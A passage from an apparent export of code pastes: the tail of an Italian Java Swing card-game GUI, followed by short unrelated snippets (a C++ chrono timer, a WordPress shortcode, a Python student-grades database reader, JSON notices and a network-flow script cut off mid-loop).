        GridBagConstraints gbcEmpty3TextArea = new GridBagConstraints();
        gbcEmpty3TextArea.weighty = 0.1;
        gbcEmpty3TextArea.weightx = 0.1;
        gbcEmpty3TextArea.gridx = 0;
        gbcEmpty3TextArea.gridy = 2;
//        mainFrame.add(new JTextArea(""Text 3""), gbcEmpty3TextArea);
        mainFrame.add(empty1TextArea, gbcEmpty1TextArea);

        GridBagConstraints gbcPlayer2TextArea = new GridBagConstraints();
        gbcPlayer2TextArea.weighty = 0.1;
        gbcPlayer2TextArea.weightx = 0.1;
        gbcPlayer2TextArea.gridx = 1;
        gbcPlayer2TextArea.gridy = 2;
        mainFrame.add(player2TextArea, gbcPlayer2TextArea);

        GridBagConstraints gbcEmpty4TextArea = new GridBagConstraints();
        gbcEmpty4TextArea.weighty = 0.1;
        gbcEmpty4TextArea.weightx = 0.1;
        gbcEmpty4TextArea.gridx = 2;
        gbcEmpty4TextArea.gridy = 2;
//        mainFrame.add(new JTextArea(""Text 4""), gbcEmpty4TextArea);
        mainFrame.add(empty1TextArea, gbcEmpty1TextArea);
    }

    private static String getStringPathFromCard(Card card) {
        String path;
        String cardRank = card.getRank().toString().toLowerCase();
        String normalizedCardRank = Character.toUpperCase(cardRank.charAt(0)) + cardRank.substring(1);

        String normalizedCardSeed = """";

        if (card.getSeed() != null) {
            String cardSeed = card.getSeed().toString().toLowerCase();
            normalizedCardSeed = Character.toUpperCase(cardSeed.charAt(0)) + cardSeed.substring(1);
        }

        path = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/iloveimg-resized"" +
                ""/"" + normalizedCardSeed + normalizedCardRank + "".png"";

        return path;
    }

    private void impostaMatriceIniziale(List<Player> listaPlayer) {
        impostaMatricePlayerUp(listaPlayer);
        impostaMatricePlayerDown(listaPlayer);

        switch (listaPlayer.size()) {
            case 3:
                impostaMatricePlayerLeft(listaPlayer);
                break;
            case 4:
                impostaMatricePlayerLeft(listaPlayer);
                impostaMatricePlayerRight(listaPlayer);
                break;
        }
    }

    private void impostaMatricePlayerRight(List<Player> listaPlayer) {
        int nFileCarta;
        int numeroCartePlayer = (listaPlayer.get(3)).getboardCardDimension();
        int indice = numeroCartePlayer;

        if (numeroCartePlayer <= 5)
            nFileCarta = 1;
        else
            nFileCarta = 2;

        if (nFileCarta == 1) {
            for (int i = 2; i < 3 + numeroCartePlayer; i++) {
                matriceScacchiera2[i][nColonne - 2] = indice--;
            }
        }

        if (nFileCarta == 2) {
            for (int i = 2 + (10 - numeroCartePlayer); i < 7; i++)
                matriceScacchiera2[i][nColonne - 1] = indice--;

            for (int i = 2; i < 7; i++)
                matriceScacchiera2[i][nColonne - 2] = indice--;
        }
    }

    private void impostaMatricePlayerLeft(List<Player> listaPlayer) {
        int indice = 1;
        int nCol;
        int numeroCartePlayer = (listaPlayer.get(2)).getboardCardDimension();

        if (numeroCartePlayer <= 5)
            nCol = 1;
        else
            nCol = 2;

        if (nCol == 1) {
            for (int i = 2; i < 2 + numeroCartePlayer; i++)
                matriceScacchiera2[i][1] = indice++;
        }

        if (nCol == 2) {
            for (int i = 2; i < 7; i++)
                matriceScacchiera2[i][1] = indice++;

            for (int i = 2; i < 7 - (10 - numeroCartePlayer); i++)
                matriceScacchiera2[i][0] = indice++;
        }
    }

    private void impostaMatricePlayerUp(List<Player> listaPlayer) {
        int nFileCarte;
        int numeroCartePlayer = (listaPlayer.getFirst()).getboardCardDimension();
        int indice = numeroCartePlayer;

        if (numeroCartePlayer <= 5)
            nFileCarte = 1;
        else
            nFileCarte = 2;

        if (nFileCarte == 1) {
            for (int j = 2; j < 2 + numeroCartePlayer; j++) {
                matriceScacchiera2[1][j] = indice--;
            }
        }

        if (nFileCarte == 2) {
            for (int j = 2 + (10 - numeroCartePlayer); j < 7; j++) {
                matriceScacchiera2[0][j] = indice--;
            }

            for (int j = 2; j < 7; j++) {
                matriceScacchiera2[1][j] = indice--;
            }
        }
    }

    private void impostaMatricePlayerDown(List<Player> listaPlayer) {
        int indice = 1;

        int nFileCarte;
        int numeroCartePlayer = (listaPlayer.get(1)).getboardCardDimension();

        if (numeroCartePlayer <= 5)
            nFileCarte = 1;
        else
            nFileCarte = 2;

        if (nFileCarte == 1) {
            for (int j = 2; j < 2 + numeroCartePlayer; j++) {
                matriceScacchiera2[nRighe - 2][j] = indice++;
            }
        }

        if (nFileCarte == 2) {
            for (int j = 2; j < 7; j++)
                matriceScacchiera2[nRighe - 2][j] = indice++;

            for (int j = 2; j < 7 - (10 - numeroCartePlayer); j++)
                matriceScacchiera2[nRighe - 1][j] = indice++;
        }
    }

    private void segnaleModificaCartaSulTavolo(Card card, int playerIndex) {
        String path = getStringPathFromCard(card);
        ImageIcon imageIcon = new ImageIcon(path);

//        if(playerIndex == 0) {
        JButton buttonCard = new JButton(imageIcon);
        buttonCard.setPreferredSize(new Dimension(lCard, hCard));
//            buttonCard.setOpaque(true);
//            buttonCard.addMouseListener(new PescaMazzoListener());
        buttonCard.addMouseListener(new PersonalMouseListeners.PescaMazzoListeners());
        sostituisciElemento(3, 4, buttonCard, this.gamePanel);
//        }
//        else{
//            JLabel labelCard = new JLabel(imageIcon);
//            labelCard.setPreferredSize(new Dimension(lCard, hCard));
//            labelCard.setOpaque(true);
//            sostituisciElemento(3, 4, labelCard);
//        }
    }

    private void segnaleModificaCartaVicinoGiocatore(Card card, int p_col, int p_row) {
        String path = getStringPathFromCard(card);
        ImageIcon imageIcon = new ImageIcon(path);
//        JButton buttonCard = new JButton(imageIcon);
        CartaPersonalizzataButton4 buttonCard = new CartaPersonalizzataButton4(path, path);
        buttonCard.setPreferredSize(new Dimension(lCard, hCard));
//        buttonCard.setOpaque(true);
        sostituisciElemento(p_col, p_row, buttonCard, this.gamePanel);
        repaintPanelFrame();

    }

    private void segnaleRimuoviCartaSpecifica(int p_col, int p_row) {
        JButton buttonCard = new JButton();
        buttonCard.setPreferredSize(new Dimension(lCard, hCard));
        buttonCard.setOpaque(false);
        sostituisciElemento(p_col, p_row, buttonCard, this.gamePanel);
        repaintPanelFrame();
    }

    public void sostituisciElemento(int p_col, int p_row, JComponent component, JPanel gamePanel) {
        int indexToRemove = (p_row * nColonne + p_col);
        gamePanel.remove(indexToRemove);

//        component.setBorder(BorderFactory.createLineBorder(Color.BLUE, 2));

        if (component instanceof JPanel)
            gamePanel.add((JPanel) component, indexToRemove);
        else
            gamePanel.add(component, indexToRemove);

    }

    public void sostituisciElementoPixel(int col, int row, JComponent componentToAdd, JPanel gamePanelReferred) {
        int indexToRemove = (row * nColonne + col);
        System.out.println(indexToRemove);
        gamePanelReferred.remove(indexToRemove);
        gamePanelReferred.add(componentToAdd, indexToRemove);
    }

    private void setPlayerBoxDetails(List<Player> playerList, JTextArea player1TextArea, JTextArea player2TextArea,
                                     JTextArea player3TextArea, JTextArea player4TextArea) {

        player1TextArea.setText("""");
        player1TextArea.append(""Nickname: "" + playerList.get(0).getNickname() + ""\n"");
        player1TextArea.append(""BoardCardDimension: "" + playerList.get(0).getboardCardDimension() + ""\n"");
        player1TextArea.append(""Lv: "" + playerList.get(0).getPartiteVinte());

        player2TextArea.setText("""");
        player2TextArea.append(""Nickname: "" + playerList.get(1).getNickname() + ""\n"");
        player2TextArea.append(""BoardCardDimension: "" + playerList.get(1).getboardCardDimension() + ""\n"");
        player2TextArea.append(""Lv: "" + playerList.get(1).getPartiteVinte());

        if (playerList.size() >= 3) {
            player3TextArea.setText("""");
            player3TextArea.append(""Nickname: "" + playerList.get(2).getNickname() + ""\n"");
            player3TextArea.append(""BoardCardDimension: "" + playerList.get(2).getboardCardDimension() + ""\n"");
            player3TextArea.append(""Lv: "" + playerList.get(2).getPartiteVinte());
        }

        if (playerList.size() >= 4) {
            player4TextArea.setText("""");
            player4TextArea.append(""Nickname: "" + playerList.get(3).getNickname() + ""\n"");
            player4TextArea.append(""BoardCardDimension: "" + playerList.get(3).getboardCardDimension() + ""\n"");
            player4TextArea.append(""Lv: "" + playerList.get(3).getPartiteVinte());
        }
    }

    private void stampaMatrice() {
        for (int[] riga : matriceScacchiera2) {
            for (int el : riga)
                System.out.print(el);
            System.out.print(""\n"");
        }
    }

    public void repaintPanelFrame() {
        mainFrame.invalidate();
        gamePanel.invalidate();
        mainFrame.repaint();
        gamePanel.repaint();
        mainFrame.revalidate();
        gamePanel.revalidate();
    }

    @Override
    public void update(Observable o, Object arg) {
        List<?> list = null;

        if (arg instanceof List<?>)
            list = (List<?>) arg;
        else
            throw new RuntimeException(""Errore nel metodo Update, non è stata fornita una lista"");

        //Passato segnale 9 che corrisponde ad inizializzazione giocatori
        if ((int) list.get(0) == 9) {
            new SchermataIniziale2();
//            repaintPanelFrame();
        }

        //Passato segnale 99 che corrisponde ad inizializzazione giocatori
        if ((int) list.get(0) == 99) {
            SchermataIniziale2.setInterrompiCiclo();
//            mainFrame.remove(schermataInizialePanel);

//            mainFrame = null;
//            return;
        }

        //Passato segnale 0 che corrisponde ad inizializzazione giocatori
        if ((int) list.get(0) == 0) {
            List<?> listaPlayer = (List<?>) list.get(1);
            if (listaPlayer.get(0) instanceof Player) {
                int playerIndex = (int) list.get(2);
                Deck discardedCards = ((Deck) list.get(3));

                creaScacchieraPixel((List<Player>) listaPlayer, playerIndex, discardedCards);
            }

            repaintPanelFrame();
        }

        //Segnale 1: aggiornamento carta sul tavolo
        // [0] int numero del segnale
        // [1] Card
        if ((int) list.get(0) == 1) {
            if (list.get(1) instanceof Card) {
                int playerIndex = (int) list.get(2);
                segnaleModificaCartaSulTavolo((Card) list.get(1), playerIndex);
            }
            repaintPanelFrame();
        }

        //Segnale 2: Aggiorno carta pescata vicino a giocatore
        if ((int) list.get(0) == 2) {
            switch ((int) list.get(2)) {
                case 0:
                    segnaleModificaCartaVicinoGiocatore((Card) list.get(1), 1, 0);
                    break;
                case 1:
                    segnaleModificaCartaVicinoGiocatore((Card) list.get(1), nColonne - 2, nRighe - 2);
                    break;
                case 2:
                    segnaleModificaCartaVicinoGiocatore((Card) list.get(1), 0, nRighe - 2);
                    break;
                case 3:
                    segnaleModificaCartaVicinoGiocatore((Card) list.get(1), nColonne - 1, 1);
                    break;
            }
            repaintPanelFrame();
        }

        //Segnale 3: Rimuovo carta pescata dal giocatore
        //[0] Segnale
        //[1] Giocatore
        if ((int) list.get(0) == 3) {
            JLabel emptyLabel = new JLabel();
            switch ((int) list.get(1)) {
                case 0:
                    segnaleRimuoviCartaSpecifica(1, 0);
                    sostituisciElemento(1, 0, emptyLabel, this.gamePanel);
                    break;
                case 1:
                    segnaleRimuoviCartaSpecifica(nColonne - 2, nRighe - 2);
                    sostituisciElemento(nColonne - 2, nRighe - 2, emptyLabel, this.gamePanel);
                    break;
                case 2:
                    segnaleRimuoviCartaSpecifica(0, nRighe - 2);
                    sostituisciElemento(0, nRighe - 2, emptyLabel, this.gamePanel);
                    break;
                case 3:
                    segnaleRimuoviCartaSpecifica(nColonne - 1, 1);
                    sostituisciElemento(nColonne - 1, 2, emptyLabel, this.gamePanel);
                    break;
            }
            repaintPanelFrame();
        }

        //Segnale 4 metodo Repain Game panel
        if ((int) list.get(0) == 4) {
            //Reimposto scacchiera giocatori
            impostaMatriceIniziale((List<Player>) list.get(1));
            int playerIndex = (int) list.get(2);
            Deck discardedCards = (Deck) list.get(3);

            //Creo una panel di appoggio
            MyPanel appGamePanel = new MyPanel(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/BackGround_Resized.png"");
            appGamePanel.setLayout(new GridLayout(9, 9));
            appGamePanel.setPreferredSize(new Dimension(widthPanel, heightPanel));

            composeGamePanelFromMatrix((List<Player>) list.get(1), appGamePanel, playerIndex, discardedCards);

            //Rimuovo ed aggiungo il nuovo pannello
            mainFrame.remove(this.gamePanel);

            GridBagConstraints gbcAppPanel = new GridBagConstraints();
            gbcAppPanel.weightx = 0.1;
            gbcAppPanel.weighty = 0.1;
            gbcAppPanel.gridx = 1;
            gbcAppPanel.gridy = 1;

            mainFrame.add(appGamePanel, gbcAppPanel);
            this.gamePanel = appGamePanel;

            ImageIcon deckImageIcon = new ImageIcon(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/"" +
                    ""iloveimg-resized/CartaCoperta.png"");


            //Ristampo il pannello
            repaintPanelFrame();
        }

        //Segnale 5 rimuovi carta sul tavolo
        if ((int) list.get(0) == 5) {
            segnaleRimuoviCartaSpecifica(3, 4);
            repaintPanelFrame();
            sostituisciElemento(3, 4, new JLabel(), this.gamePanel);
        }

        //Segnale 6: Inserimento pedina giocatore in turno
        //[0] Tipo Segnale
        //[1] Giocatore in turno
        if ((int) list.get(0) == 6) {
            int playerIndex = (int) list.get(1);

            String tokenPath = ""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/iloveimg-resized/monedaOro60.png"";
            ImageIcon tokenImage = new ImageIcon(tokenPath);
            JLabel tokenButton = new JLabel(tokenImage);
//            tokenButton.setOpaque(true);

            switch (playerIndex) {
                case 0:
                    sostituisciElemento(4, 2, tokenButton, this.gamePanel);
                    break;
                case 1:
                    sostituisciElemento(4, nRighe - 3, tokenButton, this.gamePanel);
                    break;
                case 2:
                    sostituisciElemento(2, 4, tokenButton, this.gamePanel);
                    break;
                case 3:
                    sostituisciElemento(nColonne - 3, 4, tokenButton, this.gamePanel);
                    break;
            }
            repaintPanelFrame();
        }

        if ((int) list.get(0) == 7) {
            int playerIndex = (int) list.get(1);

            switch (playerIndex) {
                case 0:
                    segnaleRimuoviCartaSpecifica(4, 2);
                    sostituisciElemento(4, 2, new JLabel(), this.gamePanel);
                    break;
                case 1:
                    segnaleRimuoviCartaSpecifica(4, nRighe - 3);
                    sostituisciElemento(4, nRighe - 3, new JLabel(), this.gamePanel);
                    break;
                case 2:
                    segnaleRimuoviCartaSpecifica(2, 4);
                    sostituisciElemento(2, 4, new JLabel(), this.gamePanel);
                    break;
                case 3:
                    segnaleRimuoviCartaSpecifica(nColonne - 3, 4);
                    sostituisciElemento(nColonne - 3, 4, new JLabel(), this.gamePanel);
                    break;
            }
            repaintPanelFrame();
        }

        if ((int) list.get(0) == 8) {
            int playerIndex = (int) list.get(1);
            int cardInHandIndex = (int) list.get(2);

            if (playerIndex == 0) {
                listaCarteButton0[cardInHandIndex].avviaAnimazioneRotazione();
            }
            if (playerIndex == 1) {
                listaCarteButton1[cardInHandIndex].avviaAnimazioneRotazione();
            }
            if (playerIndex == 2) {
                listaCarteButton2[cardInHandIndex].avviaAnimazioneRotazione();
            }
            if (playerIndex == 3) {
                listaCarteButton3[cardInHandIndex].avviaAnimazioneRotazione();
            }

        }

        if ((int) list.get(0) == 10) {
            int playerIndex = (int) list.get(1);
            int cardInHandIndex = (int) list.get(2);

            if (playerIndex == 0) {
                int finalX = listaCarteButton0[cardInHandIndex].getWidth();
                int finalY = listaCarteButton0[cardInHandIndex].getHeight();

                CartaPersonalizzataButton4 component = (CartaPersonalizzataButton4) this.gamePanel.getComponent(1);
                int initialX = component.getWidth();
                int initialY = component.getHeight();
                this.mainFrame.add(component, initialX, initialY);

                component.avviaMovimento(finalX, finalY);

            }

        }
    }

    public class SchermataIniziale {
        public static boolean interrompiCiclo = false;

        public static void setInterrompiCiclo(){interrompiCiclo = true;}

        public SchermataIniziale(){
            mainFrame = new JFrame();
            mainFrame.setSize(new Dimension(1440, 900));
            mainFrame.setDefaultCloseOperation(javax.swing.JFrame.EXIT_ON_CLOSE);

            schermataInizialePanel = new MyPanel(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/ProgettoJava/Nuovo progetto.png"");
            schermataInizialePanel.setLayout(new GridBagLayout());

            GridBagConstraints gbcJtrash = new GridBagConstraints();
            gbcJtrash.gridx = 0;
            gbcJtrash.gridy = 0;

            GridBagConstraints gbcStartGameButton = new GridBagConstraints();
            gbcStartGameButton.gridx = 0;
            gbcStartGameButton.gridy = 1;
            startGameButton = new JButton(""Avvia Gioco"");
            startGameButton.addMouseListener(new PersonalMouseListeners.AvviaGioco());

            trashLabel = new JLabel(new ImageIcon(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/ProgettoJava/JTrashScritta.png""));

            mainFrame.add(schermataInizialePanel);
            schermataInizialePanel.add(trashLabel, gbcJtrash);

            schermataInizialePanel.add(startGameButton, gbcStartGameButton);
            mainFrame.setVisible(true);

            while (1 == 1) {
                if(interrompiCiclo == true)
                    break;

                schermataInizialePanel.add(trashLabel, gbcJtrash);
                trashLabel.setVisible(true);
//                mainFrame.repaint();


                try {
                    Thread.sleep(800);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }

                trashLabel.setVisible(false);
                schermataInizialePanel.remove(trashLabel);
                schermataInizialePanel.add(new JLabel(), gbcJtrash);
//                mainFrame.repaint();

                try {
                    Thread.sleep(800);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }

//            schermataInizialePanel.remove(startGameButton);
        }
    }

    public class SchermataIniziale2{
        public static boolean interrompiCiclo = false;

        public static void setInterrompiCiclo(){interrompiCiclo = true;}

        public SchermataIniziale2() {
            interrompiCiclo = false;

            System.out.println(""SOno qui"");
            if (mainFrame == null) {
                mainFrame = new JFrame();
                mainFrame.setLayout(new GridBagLayout());
                mainFrame.setSize(new Dimension(1440, 900));
                mainFrame.setDefaultCloseOperation(javax.swing.JFrame.EXIT_ON_CLOSE);
            }
            else{
                mainFrame.remove(player1TextArea);
                mainFrame.remove(player2TextArea);
                mainFrame.remove(player3TextArea);
                mainFrame.remove(player4TextArea);
                mainFrame.remove(gamePanel);
                mainFrame.remove(empty1TextArea);
                mainFrame.repaint();

                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }

            }


            schermataInizialePanel = new MyPanel(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/ProgettoJava/Nuovo progetto.png"");
            schermataInizialePanel.setLayout(new GridBagLayout());

            GridBagConstraints gbcSchermataInizialePanel = new GridBagConstraints();
            gbcSchermataInizialePanel.weighty = 1;
            gbcSchermataInizialePanel.weightx = 1;
            gbcSchermataInizialePanel.fill = GridBagConstraints.BOTH;

            GridBagConstraints gbcJtrash = new GridBagConstraints();
            gbcJtrash.gridx = 0;
            gbcJtrash.gridy = 0;

            GridBagConstraints gbcStartGameButton = new GridBagConstraints();
            gbcStartGameButton.gridx = 0;
            gbcStartGameButton.gridy = 1;
            startGameButton = new JButton(""Avvia Gioco"");
            startGameButton.addMouseListener(new PersonalMouseListeners.AvviaGioco());

            trashLabel = new JLabel(new ImageIcon(""/Users/andrea/Il mio Drive/Università/- Metodologie di programmazione/ProgettoJava/JTrashScritta.png""));

            mainFrame.add(schermataInizialePanel, gbcSchermataInizialePanel);
            schermataInizialePanel.add(trashLabel, gbcJtrash);

            schermataInizialePanel.add(startGameButton, gbcStartGameButton);
            mainFrame.setVisible(true);

            mainFrame.repaint();


            while (1 == 1) {
                if(interrompiCiclo == true)
                    break;

                schermataInizialePanel.add(trashLabel, gbcJtrash);
                trashLabel.setVisible(true);
//                mainFrame.repaint();


                try {
                    Thread.sleep(800);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }

                trashLabel.setVisible(false);
                schermataInizialePanel.remove(trashLabel);
                schermataInizialePanel.add(new JLabel(), gbcJtrash);
//                mainFrame.repaint();

                try {
                    Thread.sleep(800);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
            
        }
    }

    public class CartaPersonalizzataButton4 extends JButton implements ActionListener {
        private Image frontCardImage;
        private Image backCardImage;
        private double scaleX = 1.0;
        private boolean revealing = false;
        private Timer timer;

        String cartaVisualizzataPath;
        String retroCartaVisualizzataPath;

        //Posizionamento del componente rispetto al Panel
        int x = getWidth();
        int y = getHeight();
        //Incremento della funzione avviaMovimento
        int deltaX;
        int deltaY;

        public CartaPersonalizzataButton4(String cartaVisualizzataPath, String retroCartaVisualizzataPath) {
            this.cartaVisualizzataPath = cartaVisualizzataPath;
            this.retroCartaVisualizzataPath = retroCartaVisualizzataPath;
            // Carica le immagini delle due carte
            backCardImage = Toolkit.getDefaultToolkit().getImage(retroCartaVisualizzataPath);
            frontCardImage = Toolkit.getDefaultToolkit().getImage(cartaVisualizzataPath);

            timer = new Timer(20, this);
        }

        public void avviaAnimazioneRotazione() {
            timer.start();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);

            // Ottieni le dimensioni del pannello
            int width = getWidth();
            int height = getHeight();

            // Calcola il centro del pannello
            int centerX = width / 2;
            int centerY = height / 2;

            // Disegna la carta frontale (superiore)
            Graphics2D g2d = (Graphics2D) g.create();
            g2d.clearRect(0, 0, width, height);
            g2d.translate(centerX, centerY);
            g2d.scale(scaleX, 1.0); // Scala sull'asse X

            if (!revealing) {
                g2d.drawImage(frontCardImage, -frontCardImage.getWidth(null) / 2, -frontCardImage.getHeight(null) / 2, null);
            } else {
    //            g2d.drawImage(backCardImage, -backCardImage.getWidth(null) / 2, -backCardImage.getHeight(null) / 2, null);
                g2d.drawImage(backCardImage, frontCardImage.getWidth(null) / 2, -backCardImage.getHeight(null) / 2, -backCardImage.getWidth(null), backCardImage.getHeight(null), null);
            }
            g2d.dispose();
        }

        @Override
        public void actionPerformed(ActionEvent e) {
            // Aggiorna l'effetto di girata della carta
            scaleX -= 0.07; // Modifica questo valore per regolare la velocità di girata

            if (scaleX <= 0 && !revealing) {
    //            System.out.println(""ScaleX: "" + scaleX);
    //            System.out.println(""Revealing: "" + revealing);
                scaleX = 0;
                revealing = true; // Inizia a rivelare la carta sottostante
                timer.setDelay(20); // Riduci la velocità di rivelazione
    //            System.out.println(""Qui"");
            } else if (scaleX <= -1.0 && revealing) {
    //            System.out.println(""Sono Else if"");
                scaleX = -1.0;

    //            revealing = false;
                timer.stop(); // Ferma il timer quando la carta è completamente rivelata
            }

            // Ridisegna il pannello
            repaint();
        }

        public void avviaMovimento(int finalx, int finaly){

            System.out.println(""Sono entrato dentro avviaMovimento"");

            if ((finalx - x) < 0)
                deltaX = -1;
            else
                deltaX = 1;

            if ((finaly - y) < 0)
                deltaY = -1;
            else
                deltaY = 1;

            if(finalx == x)
                deltaX = 0;
            if(finaly == y)
                deltaY = 0;

            Timer timerMovimento = new Timer(20, new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    if (x == finalx && y == finaly)
                        ((Timer) e.getSource()).stop();

                    // Controlla se l'oggetto ha raggiunto il bordo destro o sinistro del JPanel
                    if (x == finalx) {
                        System.out.println(""Raggiunto x"");
                    } else
                        x += deltaX;

                    if (y == finaly) {
                        System.out.println(""Raggiunto y"");
                    } else
                        y += deltaY;

                    repaint();
//                    repaintPanelFrame();
                }
            });

            timerMovimento.start();
        }
    }

    public class MovingPanel extends JPanel implements ActionListener {
        private int x = 200; // Posizione x dell'oggetto in movimento
        private int y = 100;
        private int deltaX; // Velocità di spostamento sull'asse x
        private int deltaY; // Velocità di spostamento sull'asse x
        private Timer timer;

        private int finalx;
        private int finaly;

        public MovingPanel(int finalx, int finaly) {
            timer = new Timer(10, this); // Creazione di un Timer che invoca actionPerformed ogni 10 millisecondi

            this.finalx = finalx;
            this.finaly = finaly;

            if ((finalx - x) < 0)
                deltaX = -1;
            else
                deltaX = 1;

            if ((finaly - y) < 0)
                deltaY = -1;
            else
                deltaY = 1;

            if (finalx == x)
                deltaX = 0;
            if (finaly == y)
                deltaY = 0;

            timer.start(); // Avvio del timer
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            // Disegna l'oggetto in movimento
            g.setColor(Color.RED);
            g.fillRect(x, y, 20, 20); // Disegna un rettangolo rosso come oggetto in movimento
        }

        @Override
        public void actionPerformed(ActionEvent e) {
            if (x == finalx && y == finaly)
                timer.stop();

            // Controlla se l'oggetto ha raggiunto il bordo destro o sinistro del JPanel
            if (x == finalx) {
                System.out.println(""Raggiunto x"");
            } else
                x += deltaX;

            if (y == finaly) {
                System.out.println(""Raggiunto y"");
            } else
                y += deltaY;

            repaint();
        }
    }
}"
PTGLWU7U,tv 03-2024 task,spidersam,JSON,Friday 1st of March 2024 07:39:29 AM CDT,"[
  {
    ""name"": ""ZooTv-Live-01-03-2034.mp4"",
    ""url"": ""https://hello.freeconference.com/drive_files/download/69573865-8fa0-4537-bfe6-aed308662f46.mp4"",
    ""imageUrl"": ""https://i.imgur.com/uxVAdAkm.jpeg""
  },
  {
    ""name"": ""VOTA DEPESCE!"",
    ""url"": """",
    ""imageUrl"": ""https://i.imgur.com/uxVAdAkm.jpeg""
  }
]"
jA0K5rUp,Temporizar un tiempo con chrono,AntonioVillanueva,C++,Friday 1st of March 2024 07:12:38 AM CDT,"//Contrôle du temps avec la bibliothèque chrono c++
#include <iostream>
#include <chrono>
#include <thread>

#define TEMPO 4 
bool minutor(std::chrono::steady_clock::time_point debut, std::chrono::steady_clock::time_point& fin, std::chrono::seconds tempo) {
	
    std::chrono::seconds tempsEcoule = std::chrono::duration_cast<std::chrono::seconds>(fin - debut);

    if (tempsEcoule >= tempo) {
        return true;
    } else {
        fin = std::chrono::steady_clock::now();
    }

    return false;
}

int main() {
    std::chrono::steady_clock::time_point debut = std::chrono::steady_clock::now(); //debut t
    std::chrono::steady_clock::time_point fin = std::chrono::steady_clock::now();//fin t
    std::chrono::seconds tempo = std::chrono::seconds(TEMPO);//temps à contrôler

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds());//sleep ms Un délai s'ajoute pour compliquer la situation
        
        if (minutor(debut, fin, tempo)) {
            std::cout << ""le temps est écoulé  "" << std::endl;
            return 0;
        }
    }

    return 0;
}"
gnGm2fE8,Shortcode Anzahl Kommentare,pixolin,PHP,Friday 1st of March 2024 07:07:48 AM CDT,"<?php
/*
 * Shortcode [kommentare] zur Ausgabe Anzahl der Kommentare
 */
function pix_kommentare() { 
	$comments_count = wp_count_comments();
    $message =  'Es gibt <strong>'.  esc_attr( $comments_count->approved ) . '</strong> Kommentare auf der Website.';
    $message .= '<br><strong>' . esc_attr( get_comments_number_text( 'Kein Kommentar ', 'Ein Kommentar ', '% Kommentare', $post_id ) ) . '</strong> in diesem Beitrag';

return $message; 

} 

add_shortcode('kommentare', 'pix_kommentare'); "
VLWUcnXX,Untitled,Roman9234,Python,Friday 1st of March 2024 06:41:16 AM CDT,"from connection import get_connection


@get_connection
def read_students_table(cur=None):
    cur.execute(""SELECT * FROM STUDENTS"")
    students = cur.fetchall()
    headers = ""№\tИмя\tФамилия\tОтчество\tПол\tНомер телефона""
    print(headers)
    for student in students:
        print(*student, sep=""\t"")
        
        
@get_connection
def read_teachers_table(cur=None):
    cur.execute(""SELECT * FROM teachers"")
    teachers = cur.fetchall()
    headers = ""№\tИмя\tФамилия\tОтчество\tПол\tНомер телефона""
    print(headers)
    for teacher in teachers:
        print(*teacher, sep=""\t"")

@get_connection
def read_subjects_table(cur=None):
    cur.execute(""SELECT subject_id, name FROM subjects"")
    subjects = cur.fetchall()
    headers = ""№\tНазвание предмета""
    print(headers)
    for subject in subjects:
        print(*subject, sep=""\t"")

@get_connection
def read_student_results(cur=None):
    read_students_table(cur)
    iden = """"
    while not iden.isdigit():
        iden = input(""У какого студента выведем табель успеваемости? "")
    iden = int(iden)
    try:
        cur.execute(""""""
                    SELECT *
                    FROM students
                    WHERE student_id=%d
                    """"""%(iden))
    except:
        print(""Нет такого ученика"")
        return None
    cur.execute(""""""
                SELECT first_name, last_name, pater_name, name, AVG(mark)
                FROM marks
                INNER JOIN students ON fk_student_id = students.student_id
                INNER JOIN subjects ON fk_subject_id = subjects.subject_id
                WHERE fk_student_id = %d
                GROUP BY first_name, last_name, pater_name, subjects.name;
                
                """"""%(iden))
    headers = ""Имя\tФамилия\t\tОтчество\tПредмет\t\tСредняя оценка""
    table =  cur.fetchall()
    print(headers)
    for record in table:
        print(*record, sep=""\t"")

"
5SbPiNTu,SSHNODE NOTICE,imKobz,JSON,Friday 1st of March 2024 06:20:22 AM CDT,"{
   ""notice"":""Please share our work, so we can continue our services, Thank you!"",
   ""updates"":[
      ""Added new openvpn servers."",
      ""Added ovpn config.""
   ]
}"
64Cv2GuX,max3,_who___,Python,Friday 1st of March 2024 06:13:48 AM CDT,"import numpy as np
from scipy.optimize import linprog
import matplotlib.pyplot as plt
import networkx as nx

# Define the directed graph representing the network flow
G = nx.DiGraph()

# Add nodes
G.add_node(""Source"")
G.add_node(""A"")
G.add_node(""B"")
G.add_node(""C"")
G.add_node(""Sink"")

# Add edges with capacities
G.add_edge(""Source"", ""A"", capacity=10)
G.add_edge(""Source"", ""B"", capacity=5)
G.add_edge(""A"", ""B"", capacity=3)
G.add_edge(""A"", ""C"", capacity=7)
G.add_edge(""B"", ""C"", capacity=4)
G.add_edge(""C"", ""Sink"", capacity=10)

# Visualize the original graph
plt.figure(figsize=(10, 5))
pos = nx.spring_layout(G)
nx.draw(G, pos, with_labels=True, node_size=1000, node_color='skyblue', font_weight='bold')
nx.draw_networkx_edge_labels(G, pos, edge_labels=nx.get_edge_attributes(G, 'capacity'), font_color='blue')
plt.title(""Original Network Flow Graph"")
plt.show()

# Linear programming problem setup
num_edges = len(G.edges)
c = np.zeros(num_edges)  # Cost function coefficients
A_ub = np.zeros((num_edges, num_edges))  # Inequality constraint matrix
b_ub = np.zeros(num_edges)  # Inequality constraint vector

# Set up the optimization problem
for i, (u, v, data) in enumerate(G.edges(data=True)):
    c[i] = -1  # Negative cost for maximizing the flow through each edge
    A_ub[i, i] = 1  # Flow on each edge is less than or equal to its capacity
    b_ub[i] = data['capacity']

# Flow conservation constraints
for node in G.nodes:
    if node not in ('Source', 'Sink'):
        out_edges = [i for i, (u, v) in enumerate(G.edges) if u == node]
        in_edges = [i for i, (u, v) in enumerate(G.edges) if v == node]
